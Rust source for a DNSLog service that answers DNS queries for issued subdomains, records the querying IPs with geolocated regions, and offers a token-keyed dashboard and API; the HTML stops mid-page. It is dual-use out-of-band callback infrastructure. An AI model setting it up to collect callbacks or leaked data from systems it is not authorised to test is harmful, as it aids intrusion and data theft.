use actix_web::{web, App, HttpResponse, HttpServer, Responder, HttpRequest};
use async_trait::async_trait;
use chrono::{FixedOffset, TimeZone};
use clap::Parser;
use rand::{distributions::Alphanumeric, Rng};
use rusqlite::{params, OptionalExtension};
use r2d2::Pool;
use r2d2_sqlite::SqliteConnectionManager;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::env;
use std::fs;
use std::sync::OnceLock;
use tokio::net::UdpSocket;
use tokio::sync::{mpsc, Mutex};
use trust_dns_proto::op::ResponseCode;
use trust_dns_proto::rr::RecordType;
use trust_dns_server::authority::MessageResponseBuilder;
use trust_dns_server::server::{Request, RequestHandler, ResponseHandler, ResponseInfo, ServerFuture};

const MAX_SUBDOMAINS_PER_USER: usize = 10;

// ---- Configuration ----

#[derive(Parser, Debug, Clone)]
#[command(name = "dnslog-rs", about = "DNSLog 平台 - DNS 日志捕获与管理")]
struct CliArgs {
    /// 配置文件路径
    #[arg(long, default_value = "config.toml")]
    config: String,

    /// DNS 服务端口
    #[arg(long)]
    dns_port: Option<u16>,

    /// Web HTTP 端口
    #[arg(long)]
    web_port: Option<u16>,

    /// HTTPS 端口
    #[arg(long)]
    https_port: Option<u16>,

    /// 域名后缀
    #[arg(long)]
    domain: Option<String>,

    /// TLS 证书文件路径 (PEM)
    #[arg(long)]
    tls_cert: Option<String>,

    /// TLS 私钥文件路径 (PEM)
    #[arg(long)]
    tls_key: Option<String>,
}

#[derive(Deserialize, Default, Clone)]
struct FileConfig {
    dns_port: Option<u16>,
    web_port: Option<u16>,
    https_port: Option<u16>,
    domain: Option<String>,
    tls_cert: Option<String>,
    tls_key: Option<String>,
}

#[derive(Debug, Clone)]
struct AppConfig {
    dns_port: u16,
    web_port: u16,
    https_port: Option<u16>,
    domain: String,
    tls_cert: Option<String>,
    tls_key: Option<String>,
}

impl AppConfig {
    fn load() -> Self {
        let cli = CliArgs::parse();

        // Load from config file
        let file_cfg: FileConfig = if let Ok(content) = fs::read_to_string(&cli.config) {
            toml::from_str(&content).unwrap_or_else(|e| {
                eprintln!("警告: 解析配置文件 {} 失败: {}", cli.config, e);
                FileConfig::default()
            })
        } else {
            FileConfig::default()
        };

        // Merge: CLI args > config file > env vars > defaults
        let dns_port = cli.dns_port
            .or(file_cfg.dns_port)
            .or_else(|| env::var("DNS_PORT").ok().and_then(|v| v.parse().ok()))
            .unwrap_or(53);

        let web_port = cli.web_port
            .or(file_cfg.web_port)
            .or_else(|| env::var("WEB_PORT").ok().and_then(|v| v.parse().ok()))
            .unwrap_or(8888);

        let https_port = cli.https_port
            .or(file_cfg.https_port)
            .or_else(|| env::var("HTTPS_PORT").ok().and_then(|v| v.parse().ok()));

        let domain = cli.domain
            .or(file_cfg.domain)
            .or_else(|| env::var("DOMAIN_SUFFIX").ok())
            .unwrap_or_else(|| "example.com".to_string());

        let tls_cert = cli.tls_cert
            .or(file_cfg.tls_cert)
            .or_else(|| env::var("TLS_CERT").ok());

        let tls_key = cli.tls_key
            .or(file_cfg.tls_key)
            .or_else(|| env::var("TLS_KEY").ok());

        Self { dns_port, web_port, https_port, domain, tls_cert, tls_key }
    }
}

// ---- Domain helper ----

static CONFIG: OnceLock<AppConfig> = OnceLock::new();

fn domain_suffix() -> &'static str {
    &CONFIG.get().unwrap().domain
}

// ---- Time helpers ----

fn shanghai_offset() -> FixedOffset {
    FixedOffset::east_opt(8 * 3600).unwrap()
}

fn now_ts() -> i64 {
    chrono::Utc::now().timestamp()
}

fn format_ts(ts: i64) -> String {
    let dt = shanghai_offset().timestamp_opt(ts, 0).single().unwrap();
    dt.format("%Y-%m-%d %H:%M:%S").to_string()
}

fn relative_time(ts: i64) -> String {
    let diff = now_ts() - ts;
    if diff < 0 { return "刚刚".to_string(); }
    if diff < 60 { return format!("{}秒前", diff); }
    if diff < 3600 { return format!("{}分钟前", diff / 60); }
    if diff < 86400 { return format!("{}小时前", diff / 3600); }
    format!("{}天前", diff / 86400)
}

// ---- Data structures ----

#[derive(Debug, Serialize)]
struct LogRecord {
    domain: String,
    client_ip: String,
    ip_region: String,
    timestamp: String,
    relative_time: String,
    record_type: String,
}

#[derive(Serialize)]
struct SubdomainLogs {
    subdomain: String,
    log_count: usize,
    logs: Vec<LogRecord>,
}

#[derive(Serialize)]
struct NewSubResponse {
    new_sub: String,
    subdomains: Vec<String>,
}

#[derive(Serialize)]
struct SubdomainsResponse {
    subdomains: Vec<String>,
}

#[derive(Serialize)]
struct ClearResponse {
    cleared: usize,
}

#[derive(Serialize)]
struct CallbackResponse {
    subdomain: String,
    log_count: usize,
    logs: Vec<LogRecord>,
}

// ---- IP Region Lookup Service ----

struct IpLookupService {
    cache: Mutex<HashMap<String, String>>,
    rx: Mutex<mpsc::Receiver<String>>,
    pool: Pool<SqliteConnectionManager>,
}

impl IpLookupService {
    fn new(rx: mpsc::Receiver<String>, pool: Pool<SqliteConnectionManager>) -> Self {
        Self { cache: Mutex::new(HashMap::new()), rx: Mutex::new(rx), pool }
    }

    async fn run(self) {
        let client = match reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(5))
            .build() {
                Ok(c) => c,
                Err(_) => return,
            };

        loop {
            let ip = {
                let mut rx = self.rx.lock().await;
                match rx.recv().await {
                    Some(ip) => ip,
                    None => break,
                }
            };

            if Self::is_private_ip(&ip) { continue; }

            {
                let cache = self.cache.lock().await;
                if cache.contains_key(&ip) { continue; }
            }

            let url = format!("http://ip-api.com/json/{}?lang=zh-CN&fields=status,country,regionName,city", ip);
            let region = match client.get(&url).send().await {
                Ok(resp) => match resp.json::<serde_json::Value>().await {
                    Ok(data) => {
                        if data["status"] == "success" {
                            let c = data["country"].as_str().unwrap_or("");
                            let r = data["regionName"].as_str().unwrap_or("");
                            let ci = data["city"].as_str().unwrap_or("");
                            let s = format!("{} {} {}", c, r, ci).trim().to_string();
                            if s.is_empty() { "未知".to_string() } else { s }
                        } else { "未知".to_string() }
                    }
                    Err(_) => "未知".to_string(),
                },
                Err(_) => "未知".to_string(),
            };

            {
                let mut cache = self.cache.lock().await;
                cache.insert(ip.clone(), region.clone());
            }

            let pool = self.pool.clone();
            let ip_c = ip.clone();
            let region_c = region.clone();
            tokio::task::spawn_blocking(move || {
                if let Ok(conn) = pool.get() {
                    let _ = conn.execute(
                        "UPDATE logs SET ip_region = ?1 WHERE client_ip = ?2 AND (ip_region IS NULL OR ip_region = '')",
                        params![region_c, ip_c],
                    );
                }
            }).await.ok();
        }
    }

    fn is_private_ip(ip: &str) -> bool {
        ip.starts_with("127.") || ip.starts_with("10.") || ip.starts_with("192.168.")
            || (ip.starts_with("172.") && {
                let parts: Vec<&str> = ip.split('.').collect();
                parts.get(1).and_then(|s| s.parse::<u8>().ok()).map_or(false, |b| b >= 16 && b <= 31)
            })
            || ip == "::1" || ip.starts_with("fe80:") || ip.starts_with("fc") || ip.starts_with("fd")
    }
}

// ---- DNS Handler ----

struct MyDnsHandler {
    pool: Pool<SqliteConnectionManager>,
    ip_tx: mpsc::Sender<String>,
}

fn record_type_string(rt: RecordType) -> &'static str {
    match rt {
        RecordType::A => "A", RecordType::AAAA => "AAAA", RecordType::CNAME => "CNAME",
        RecordType::MX => "MX", RecordType::TXT => "TXT", RecordType::NS => "NS",
        RecordType::SOA => "SOA", RecordType::PTR => "PTR", RecordType::SRV => "SRV",
        RecordType::CAA => "CAA", RecordType::ANY => "ANY", _ => "OTHER",
    }
}

#[async_trait]
impl RequestHandler for MyDnsHandler {
    async fn handle_request<R: ResponseHandler>(
        &self, request: &Request, mut response_handle: R,
    ) -> ResponseInfo {
        let query = request.query();
        let query_name = query.name().to_string();
        let normalized_query = query_name.trim_end_matches('.').to_lowercase();
        let client_ip = request.src().ip().to_string();
        let timestamp = now_ts();
        let rt = record_type_string(query.query_type());
        let pool = self.pool.clone();
        let ip_tx = self.ip_tx.clone();
        let ip_for_lookup = client_ip.clone();

        tokio::task::spawn_blocking(move || {
            let conn = pool.get().expect("Failed to get DB connection");
            let result: Option<(String, String)> = conn
                .query_row(
                    "SELECT user_token, subdomain FROM subdomains WHERE ?1 = subdomain OR ?1 LIKE '%.' || subdomain",
                    params![normalized_query],
                    |row| Ok((row.get(0)?, row.get(1)?)),
                )
                .optional()
                .expect("DB query failed");
            if let Some((_token, registered_sub)) = result {
                println!("DNS [{}] {} -> {} 来源 {}", rt, normalized_query, registered_sub, client_ip);
                let _ = conn.execute(
                    "INSERT INTO logs (registered_subdomain, requested_domain, client_ip, timestamp, record_type) VALUES (?1, ?2, ?3, ?4, ?5)",
                    params![registered_sub, normalized_query, client_ip, timestamp, rt],
                );
                let _ = ip_tx.try_send(ip_for_lookup);
            } else {
                println!("DNS [{}] {} (未注册) 来源 {}", rt, normalized_query, client_ip);
            }
        }).await.expect("spawn_blocking failed");

        let response = MessageResponseBuilder::from_message_request(request)
            .error_msg(request.header(), ResponseCode::NXDomain);
        response_handle.send_response(response).await.expect("failed to send response")
    }
}

fn random_string(len: usize) -> String {
    rand::thread_rng().sample_iter(&Alphanumeric).take(len).map(char::from).collect::<String>().to_lowercase()
}

async fn auto_register(pool: &Pool<SqliteConnectionManager>, access_ip: String) -> String {
    let token = random_string(16);
    let default_sub = format!("{}.{}", random_string(8), domain_suffix());
    let pool_clone = pool.clone();
    let tk = token.clone();
    tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().expect("Failed to get DB connection");
        conn.execute("INSERT INTO users (token, access_ip) VALUES (?1, ?2)", params![tk.clone(), access_ip]).expect("Failed to insert user");
        conn.execute("INSERT INTO subdomains (user_token, subdomain) VALUES (?1, ?2)", params![tk, default_sub]).expect("Failed to insert subdomain");
    }).await.expect("spawn_blocking failed");
    token
}

// ---- API Handlers ----

async fn subdomains_api(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 token 参数"})),
    };
    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().map_err(|e| e.to_string())?;
        let mut stmt = conn.prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1").map_err(|e| e.to_string())?;
        let iter = stmt.query_map(params![token], |row| row.get::<_, String>(0)).map_err(|e| e.to_string())?;
        let mut subs = Vec::new();
        for s in iter { subs.push(s.map_err(|e| e.to_string())?); }
        Ok(subs)
    }).await.map_err(|e| e.to_string()).and_then(|inner| inner);

    match res {
        Ok(subdomains) => HttpResponse::Ok().json(SubdomainsResponse { subdomains }),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": e})),
    }
}

async fn newsub_api(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 token 参数"})),
    };
    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking({
        let tk = token.clone();
        move || {
            let conn = pool_clone.get().expect("Failed to get DB connection");
            let exists: Option<String> = conn.query_row("SELECT token FROM users WHERE token = ?1", params![tk.clone()], |row| row.get(0)).optional().expect("query failed");
            if exists.is_none() { return Err("用户不存在".to_string()); }
            let count: i64 = conn.query_row("SELECT COUNT(*) FROM subdomains WHERE user_token = ?1", params![tk.clone()], |row| row.get(0)).expect("count failed");
            if count >= MAX_SUBDOMAINS_PER_USER as i64 { return Err(format!("子域名数量已达上限 ({})", MAX_SUBDOMAINS_PER_USER)); }
            let new_sub = format!("{}.{}", random_string(8), domain_suffix());
            conn.execute("INSERT INTO subdomains (user_token, subdomain) VALUES (?1, ?2)", params![tk.clone(), new_sub.clone()]).expect("insert failed");
            let mut stmt = conn.prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1").expect("prepare failed");
            let iter = stmt.query_map(params![tk], |row| row.get::<_, String>(0)).expect("query failed");
            let mut subs = Vec::new();
            for s in iter { subs.push(s.expect("get failed")); }
            Ok((new_sub, subs))
        }
    }).await.map_err(|e| e.to_string()).and_then(|inner| inner);

    match res {
        Ok((new_sub, subdomains)) => HttpResponse::Ok().json(NewSubResponse { new_sub, subdomains }),
        Err(e) => HttpResponse::BadRequest().json(serde_json::json!({"error": e})),
    }
}

async fn delete_sub_api(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 token 参数"})),
    };
    let subdomain = match query.get("subdomain") {
        Some(s) => s.to_lowercase(),
        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 subdomain 参数"})),
    };
    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().map_err(|e| e.to_string())?;
        // Verify ownership
        let owner: Option<String> = conn.query_row(
            "SELECT user_token FROM subdomains WHERE subdomain = ?1",
            params![subdomain],
            |row| row.get(0),
        ).optional().map_err(|e| e.to_string())?;
        match owner {
            Some(owner_token) if owner_token == token => {
                // Delete logs first, then subdomain
                conn.execute("DELETE FROM logs WHERE registered_subdomain = ?1", params![subdomain]).map_err(|e| e.to_string())?;
                conn.execute("DELETE FROM subdomains WHERE subdomain = ?1", params![subdomain]).map_err(|e| e.to_string())?;
                Ok(())
            }
            Some(_) => Err("无权删除该子域名".to_string()),
            None => Err("子域名不存在".to_string()),
        }
    }).await.map_err(|e| e.to_string()).and_then(|inner| inner);

    match res {
        Ok(()) => HttpResponse::Ok().json(serde_json::json!({"success": true})),
        Err(e) => HttpResponse::BadRequest().json(serde_json::json!({"error": e})),
    }
}

async fn get_logs_json(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 token 参数"})),
    };
    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().map_err(|e| e.to_string())?;
        let mut stmt = conn.prepare("SELECT subdomain FROM subdomains WHERE user_token = ?1").map_err(|e| e.to_string())?;
        let sub_iter = stmt.query_map(params![token], |row| row.get::<_, String>(0)).map_err(|e| e.to_string())?;
        let mut data = Vec::new();
        let now = now_ts();
        let cutoff = now - 3600;
        for sub in sub_iter {
            let sub: String = sub.map_err(|e| e.to_string())?;
            let mut stmt = conn.prepare(
                "SELECT requested_domain, client_ip, timestamp, record_type, COALESCE(ip_region, '') FROM logs WHERE registered_subdomain = ?1 AND timestamp >= ?2 ORDER BY id DESC"
            ).map_err(|e| e.to_string())?;
            let log_iter = stmt.query_map(params![sub.clone(), cutoff], |row| {
                let ts: i64 = row.get(2)?;
                let rt: String = row.get(3).unwrap_or_default();
                let region: String = row.get(4).unwrap_or_default();
                Ok(LogRecord {
                    domain: row.get(0)?,
                    client_ip: row.get(1)?,
                    ip_region: region,
                    timestamp: format_ts(ts),
                    relative_time: relative_time(ts),
                    record_type: if rt.is_empty() { "A".to_string() } else { rt },
                })
            }).map_err(|e| e.to_string())?;
            let mut logs = Vec::new();
            for log in log_iter { logs.push(log.map_err(|e| e.to_string())?); }
            let log_count = logs.len();
            data.push(SubdomainLogs { subdomain: sub, log_count, logs });
        }
        Ok(data)
    }).await.map_err(|e| e.to_string()).and_then(|inner| inner);

    match res {
        Ok(data) => HttpResponse::Ok().json(data),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": e})),
    }
}

async fn clear_logs_api(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => return HttpResponse::BadRequest().json(serde_json::json!({"error": "缺少 token 参数"})),
    };
    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().map_err(|e| e.to_string())?;
        let cleared = conn.execute(
            "DELETE FROM logs WHERE registered_subdomain IN (SELECT subdomain FROM subdomains WHERE user_token = ?1)",
            params![token],
        ).map_err(|e| e.to_string())?;
        Ok(cleared)
    }).await.map_err(|e| e.to_string()).and_then(|inner| inner);

    match res {
        Ok(cleared) => HttpResponse::Ok().json(ClearResponse { cleared }),
        Err(e) => HttpResponse::InternalServerError().json(serde_json::json!({"error": e})),
    }
}

async fn callback_api(
    pool: web::Data<Pool<SqliteConnectionManager>>,
    path: web::Path<String>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let subdomain = path.into_inner().to_lowercase();
    let limit: i64 = query.get("limit").and_then(|l| l.parse().ok()).unwrap_or(10).min(100);
    let pool_clone = pool.get_ref().clone();
    let res = tokio::task::spawn_blocking(move || {
        let conn = pool_clone.get().map_err(|e| e.to_string())?;
        let exists: Option<String> = conn.query_row("SELECT subdomain FROM subdomains WHERE subdomain = ?1", params![subdomain], |row| row.get(0)).optional().map_err(|e| e.to_string())?;
        let sub = match exists { Some(s) => s, None => return Err("子域名不存在".to_string()) };
        let mut stmt = conn.prepare(
            "SELECT requested_domain, client_ip, timestamp, record_type, COALESCE(ip_region, '') FROM logs WHERE registered_subdomain = ?1 ORDER BY id DESC LIMIT ?2"
        ).map_err(|e| e.to_string())?;
        let log_iter = stmt.query_map(params![sub.clone(), limit], |row| {
            let ts: i64 = row.get(2)?;
            let rt: String = row.get(3).unwrap_or_default();
            let region: String = row.get(4).unwrap_or_default();
            Ok(LogRecord {
                domain: row.get(0)?,
                client_ip: row.get(1)?,
                ip_region: region,
                timestamp: format_ts(ts),
                relative_time: relative_time(ts),
                record_type: if rt.is_empty() { "A".to_string() } else { rt },
            })
        }).map_err(|e| e.to_string())?;
        let mut logs = Vec::new();
        for log in log_iter { logs.push(log.map_err(|e| e.to_string())?); }
        let log_count = logs.len();
        Ok(CallbackResponse { subdomain: sub, log_count, logs })
    }).await.map_err(|e| e.to_string()).and_then(|inner| inner);

    match res {
        Ok(data) => HttpResponse::Ok().json(data),
        Err(e) => HttpResponse::NotFound().json(serde_json::json!({"error": e})),
    }
}

// ---- Dashboard ----

async fn dashboard(
    req: HttpRequest,
    pool: web::Data<Pool<SqliteConnectionManager>>,
    query: web::Query<HashMap<String, String>>,
) -> impl Responder {
    let access_ip = req.connection_info().realip_remote_addr().unwrap_or("unknown").to_string();

    // If no token in URL, auto-register and REDIRECT to URL with token
    let token = match query.get("token") {
        Some(t) => t.to_string(),
        None => {
            let new_token = auto_register(&pool, access_ip).await;
            return HttpResponse::Found()
                .append_header(("Location", format!("/?token={}", new_token)))
                .finish();
        }
    };

    let html = format!(r##"<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DNSLog</title>
<style>
:root {{
    --bg-primary: #0d1117; --bg-secondary: #161b22; --bg-tertiary: #21262d;
    --bg-card: rgba(22, 27, 34, 0.8); --border: #30363d;
    --text-primary: #e6edf3; --text-secondary: #8b949e; --text-muted: #484f58;
    --accent-green: #3fb950; --accent-cyan: #58a6ff; --accent-blue: #388bfd;
    --accent-purple: #bc8cff; --accent-orange: #d29922; --accent-red: #f85149; --accent-pink: #f778ba;
    --shadow: 0 8px 24px rgba(0, 0, 0, 0.4); --radius: 12px; --radius-sm: 8px;
}}
* {{ margin: 0; padding: 0; box-sizing: border-box; }}
body {{ font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif; background: var(--bg-primary); color: var(--text-primary); min-height: 100vh; line-height: 1.5; }}
.app-header {{ background: var(--bg-secondary); border-bottom: 1px solid var(--border); padding: 16px 0; position: sticky; top: 0; z-index: 100; backdrop-filter: blur(12px); }}
.header-inner {{ max-width: 1200px; margin: 0 auto; padding: 0 24px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 12px; }}
.logo {{ display: flex; align-items: center; gap: 10px; }}
.logo-icon {{ width: 32px; height: 32px; background: linear-gradient(135deg, var(--accent-green), var(--accent-cyan)); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; color: #000; }}
.logo-text {{ font-size: 18px; font-weight: 700; background: linear-gradient(135deg, var(--accent-green), var(--accent-cyan)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }}
.header-meta {{ display: flex; align-items: center; gap: 16px; flex-wrap: wrap; }}
.token-display {{ display: flex; align-items: center; gap: 8px; background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: var(--radius-sm); padding: 6px 12px; font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace; font-size: 13px; cursor: pointer; transition: border-color 0.2s; }}
.token-display:hover {{ border-color: var(--accent-cyan); }}
.token-label {{ color: var(--text-secondary); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; font-size: 12px; }}
.copy-icon {{ color: var(--text-muted); font-size: 12px; transition: color 0.2s; }}
.token-display:hover .copy-icon {{ color: var(--accent-cyan); }}
.main-content {{ max-width: 1200px; margin: 0 auto; padding: 24px; display: grid; gap: 20px; }}
.card {{ background: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius); backdrop-filter: blur(12px); overflow: hidden; }}
.card-header {{ display: flex; align-items: center; justify-content: space-between; padding: 16px 20px; border-bottom: 1px solid var(--border); flex-wrap: wrap; gap: 12px; }}
.card-title {{ font-size: 15px; font-weight: 600; display: flex; align-items: center; gap: 8px; }}
.card-body {{ padding: 20px; }}
.badge {{ display: inline-flex; align-items: center; justify-content: center; min-width: 22px; height: 22px; padding: 0 6px; border-radius: 12px; font-size: 12px; font-weight: 600; background: var(--accent-green); color: #000; }}
.badge-muted {{ background: var(--bg-tertiary); color: var(--text-secondary); }}
.btn {{ display: inline-flex; align-items: center; gap: 6px; padding: 8px 16px; border-radius: var(--radius-sm); border: 1px solid var(--border); background: var(--bg-tertiary); color: var(--text-primary); font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s; font-family: inherit; user-select: none; }}
.btn:hover {{ background: var(--border); border-color: var(--text-muted); }}
.btn:active {{ transform: scale(0.97); }}
.btn-primary {{ background: var(--accent-green); border-color: var(--accent-green); color: #000; font-weight: 600; }}
.btn-primary:hover {{ background: #2ea043; border-color: #2ea043; }}
.btn-danger {{ border-color: var(--accent-red); color: var(--accent-red); background: transparent; }}
.btn-danger:hover {{ background: rgba(248, 81, 73, 0.15); }}
.btn-sm {{ padding: 4px 10px; font-size: 12px; }}
.btn-group {{ display: flex; gap: 8px; flex-wrap: wrap; }}
.subdomain-list {{ display: flex; flex-direction: column; gap: 8px; }}
.subdomain-item {{ display: flex; align-items: center; justify-content: space-between; padding: 10px 14px; background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: var(--radius-sm); gap: 12px; transition: border-color 0.2s; }}
.subdomain-item:hover {{ border-color: var(--accent-cyan); }}
.subdomain-name {{ font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace; font-size: 13px; color: var(--accent-cyan); word-break: break-all; cursor: pointer; flex: 1; }}
.subdomain-name:hover {{ color: var(--accent-green); }}
.subdomain-actions {{ display: flex; gap: 6px; flex-shrink: 0; }}
.log-section {{ margin-top: 16px; }}
.log-section:first-child {{ margin-top: 0; }}
.log-section-header {{ display: flex; align-items: center; justify-content: space-between; padding: 10px 14px; background: var(--bg-tertiary); border: 1px solid var(--border); border-radius: var(--radius-sm) var(--radius-sm) 0 0; flex-wrap: wrap; gap: 8px; }}
.log-section-title {{ font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace; font-size: 13px; color: var(--accent-purple); }}
.log-table {{ width: 100%; border-collapse: collapse; }}
.log-table th {{ padding: 10px 14px; text-align: left; font-size: 12px; font-weight: 600; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.5px; background: var(--bg-secondary); border-bottom: 1px solid var(--border); }}
.log-table td {{ padding: 10px 14px; font-size: 13px; border-bottom: 1px solid var(--border); vertical-align: middle; }}
.log-table tr:last-child td {{ border-bottom: none; }}
.log-table tr {{ transition: background 0.15s; }}
.log-table tr:hover {{ background: rgba(56, 139, 253, 0.06); }}
.log-domain {{ font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace; font-size: 12px; color: var(--text-primary); word-break: break-all; max-width: 360px; }}
.log-ip {{ font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace; font-size: 12px; color: var(--accent-orange); }}
.log-region {{ font-size: 12px; color: var(--text-secondary); }}
.log-time {{ color: var(--text-secondary); font-size: 12px; white-space: nowrap; }}
.log-time-abs {{ font-size: 11px; color: var(--text-muted); display: block; margin-top: 2px; }}
.record-type {{ display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px; font-weight: 600; font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace; }}
.type-a {{ background: rgba(63, 185, 80, 0.15); color: var(--accent-green); }}
.type-aaaa {{ background: rgba(188, 140, 255, 0.15); color: var(--accent-purple); }}
.type-cname {{ background: rgba(88, 166, 255, 0.15); color: var(--accent-cyan); }}
.type-mx {{ background: rgba(210, 153, 34, 0.15); color: var(--accent-orange); }}
.type-txt {{ background: rgba(247, 120, 186, 0.15); color: var(--accent-pink); }}
.type-other {{ background: var(--bg-tertiary); color: var(--text-secondary); }}
@keyframes logFlash {{ 0% {{ background: rgba(63, 185, 80, 0.2); }} 100% {{ background: transparent; }} }}
.log-new {{ animation: logFlash 2s ease-out; }}
.empty-state {{ text-align: center; padding: 40px 20px; color: var(--text-muted); }}
.empty-icon {{ font-size: 36px; margin-bottom: 12px; opacity: 0.5; }}
.empty-text {{ font-size: 14px; margin-bottom: 4px; }}
.empty-hint {{ font-size: 12px; color: var(--text-muted); }}
.tip-box {{ padding: 14px 16px; background: rgba(210, 153, 34, 0.08); border: 1px solid rgba(210, 153, 34, 0.2); border-radius: var(--radius-sm); font-size: 13px; color: var(--text-secondary); line-height: 1.6; }}
.tip-box code {{ background: var(--bg-tertiary); padding: 2px 6px; border-radius: 4px; font-family: 'SF Mono', 'Cascadia Code', 'Fira Code', monospace; font-size: 12px; color: var(--accent-orange); }}
.status-bar {{ display: flex; align-items: center; gap: 12px; font-size: 12px; color: var(--text-muted); padding: 12px 20px; border-top: 1px solid var(--border); }}
.status-dot {{ width: 8px; height: 8px; border-radius: 50%; background: var(--accent-green); box-shadow: 0 0 6px var(--accent-green); }}
.status-dot.disconnected {{ background: var(--accent-red); box-shadow: 0 0 6px var(--accent-red); }}
.toast-container {{ position: fixed; top: 80px; right: 24px; z-index: 1000; display: flex; flex-direction: column; gap: 8px; }}
.toast {{ padding: 10px 16px; border-radius: var(--radius-sm); font-size: 13px; color: #fff; background: var(--bg-tertiary); border: 1px solid var(--border); box-shadow: var(--shadow); animation: toastIn 0.3s ease-out; max-width: 320px; }}
.toast-success {{ border-left: 3px solid var(--accent-green); }}
.toast-error {{ border-left: 3px solid var(--accent-red); }}
.toast-info {{ border-left: 3px solid var(--accent-cyan); }}
@keyframes toastIn {{ from {{ opacity: 0; transform: translateX(40px); }} to {{ opacity: 1; transform: translateX(0); }} }}
@keyframes toastOut {{ from {{ opacity: 1; transform: translateX(0); }} to {{ opacity: 0; transform: translateX(40px); }} }}
.footer {{ text-align: center; padding: 20px; font-size: 12px; color: var(--text-muted); border-top: 1px solid var(--border); margin-top: 20px; }}
@media (max-width: 768px) {{
    .header-inner {{ flex-direction: column; align-items: flex-start; }}
    .main-content {{ padding: 12px; }}
    .card-body {{ padding: 14px; }}
    .log-table th, .log-table td {{ padding: 8px 10px; }}
    .btn-group {{ width: 100%; }}
    .btn-group .btn {{ flex: 1; justify-content: center; }}
}}
::-webkit-scrollbar {{ width: 8px; height: 8px; }}
::-webkit-scrollbar-track {{ background: var(--bg-primary); }}
::-webkit-scrollbar-thumb {{ background: var(--bg-tertiary); border-radius: 4px; }}
::-webkit-scrollbar-thumb:hover {{ background: var(--border); }}
</style>
</head>
<body>
<header class="app-header">
    <div class="header-inner">
        <div class="logo"><div class="logo-icon">D</div><span class="logo-text">DNSLog</span></div>
        <div class="header-meta">
            <div class="token-display" id="tokenDisplay" title="点击复制令牌">
                <span class="token-label">令牌</span>
                <span id="tokenValue">{token}</span>
                <span class="copy-icon">&#x2398;</span>
            </div>
        </div>
    </div>
</header>
<main class="main-content">
    <div class="card">
        <div class="card-header">
            <div class="card-title"><span>&#x1F310;</span> 子域名管理 <span id="subCount" class="badge-muted badge">0</span></div>
            <button class="btn btn-primary" id="newSubBtn"><span>+</span> 申请新子域名</button>
        </div>
        <div class="card-body"><div id="subdomainsList" class="subdomain-list"><div class="empty-state"><div class="empty-icon">&#x1F50D;</div><div class="empty-text">加载中...</div></div></div></div>
    </div>
    <div class="card">
        <div class="card-header">
            <div class="card-title"><span>&#x1F4CB;</span> DNS 日志 <span style="font-size:12px;color:var(--text-muted);font-weight:400;">（最近 1 小时）</span> <span id="logCount" class="badge">0</span></div>
            <div class="btn-group">
                <button class="btn btn-sm" id="refreshBtn">&#x21BB; 刷新</button>
                <button class="btn btn-sm btn-danger" id="clearBtn">&#x1F5D1; 清空</button>
            </div>
        </div>
        <div class="card-body" id="logsContainer"><div class="empty-state"><div class="empty-icon">&#x1F4ED;</div><div class="empty-text">暂无日志</div><div class="empty-hint">子域名收到的 DNS 查询将显示在这里</div></div></div>
        <div class="status-bar"><div id="statusDot" class="status-dot"></div><span id="statusText">已连接</span><span style="margin-left:auto;">自动刷新: 3秒</span></div>
    </div>
    <div class="card">
        <div class="card-header"><div class="card-title"><span>&#x1F4A1;</span> 使用提示</div></div>
